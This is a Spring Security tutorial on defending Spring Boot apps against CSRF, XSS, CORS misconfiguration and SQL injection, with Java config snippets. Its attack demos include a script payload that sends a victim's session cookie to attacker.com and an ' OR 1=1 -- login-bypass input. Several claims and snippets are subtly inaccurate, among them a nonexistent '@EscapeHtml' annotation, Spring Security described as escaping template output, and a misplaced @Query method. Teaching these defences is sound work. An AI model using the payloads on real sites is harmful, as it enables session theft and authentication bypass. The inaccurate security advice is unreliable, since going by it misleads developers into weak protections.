Spring Security protects Spring Boot applications from common web attacks like CSRF, XSS, SQL injection, and misconfigured CORS by default or through simple configuration. [geeksforgeeks](https://www.geeksforgeeks.org/advance-java/csrf-protection-in-spring-security/)

## CSRF (Cross-Site Request Forgery)

CSRF tricks authenticated browsers into making unwanted requests to a site by automatically attaching session cookies from prior logins.  

**Attack Demo**: User logs into `localhost:8080` (session stored in cookie), clicks malicious link (`attacker.com`), browser sends `/transfer` request with valid session, unauthorized money transfer executes.

**Protection**: Spring Security auto-generates CSRF tokens stored in `HttpSession`. Forms include `<input type="hidden" name="_csrf" th:value="${_csrf.token}"/>`; browser sends token in POST requests. Server validates token match. [docs.spring](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf -> csrf.csrfTokenRepository(HttpSessionCsrfTokenRepository.withHeaderName("_csrf")))
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
        return http.build();
    }
}
```

## XSS (Cross-Site Scripting)

XSS injects malicious scripts into web pages viewed by others, often stealing cookies/sessions via comment fields or user input. 

**Attack Demo**: Attacker posts `<script>document.location='attacker.com?cookie='+document.cookie</script>` as comment. Legitimate users loading page execute script, sending session cookies to attacker.

**Protection**: Escape user input with Thymeleaf (`[[${comment}]]`) or `@EscapeHtml` in controllers. Spring Security auto-escapes JSP/Thymeleaf output; validate input (`@Valid`, whitelists).
```java
@PostMapping("/comment")
public String addComment(@Valid @RequestParam String comment) {
    // Spring auto-escapes th:text="${comment}"
    comments.add(HtmlUtils.htmlEscape(comment));  // Manual escape
    return "redirect:/xss";
}
```

## CORS (Cross-Origin Resource Sharing)

CORS is a security feature blocking cross-origin requests (different protocol/domain/port) unless explicitly allowed. 
**Default Behavior**: Browser blocks `http://client:3000` → `http://localhost:8080` if origins mismatch.

**Configuration**:
```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("http://localhost:3000"));
    config.setAllowedMethods(List.of("GET", "POST"));
    config.setAllowedHeaders(List.of("*"));
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

## SQL Injection

Attackers inject SQL via unparameterized queries: `username = " OR 1=1 --` returns all users. 

**Attack Demo**: `/find?name=' OR 1=1 --` → `SELECT * FROM users WHERE name='' OR 1=1 --'`, bypasses auth.

**Protection**: Use Spring Data JPA parameterized queries (default) or `@Query` with named parameters. 

```java
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsername(String username);  // Auto-parameterized
}
```

## Complete Protection Checklist

| Attack | Spring Security Default | Manual Config | Best Practice |
|--------|-----------------------|---------------|---------------|
| CSRF | Enabled for POST/PUT/DELETE | Custom token repo | Include token in forms/SPA headers  [docs.spring](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html) |
| XSS | Input escaping | Content-Security-Policy headers | Validate + escape all user input 
| CORS | Blocked (same-origin only) | `@CrossOrigin` or global config | Whitelist trusted origins only  
| SQL Injection | Parameterized queries | Named params in `@Query` | Never concatenate user input 

Enable with one dependency: `spring-boot-starter-security`. CSRF/XSS protections activate automatically. [geeksforgeeks](https://www.geeksforgeeks.org/advance-java/csrf-protection-in-spring-security/)
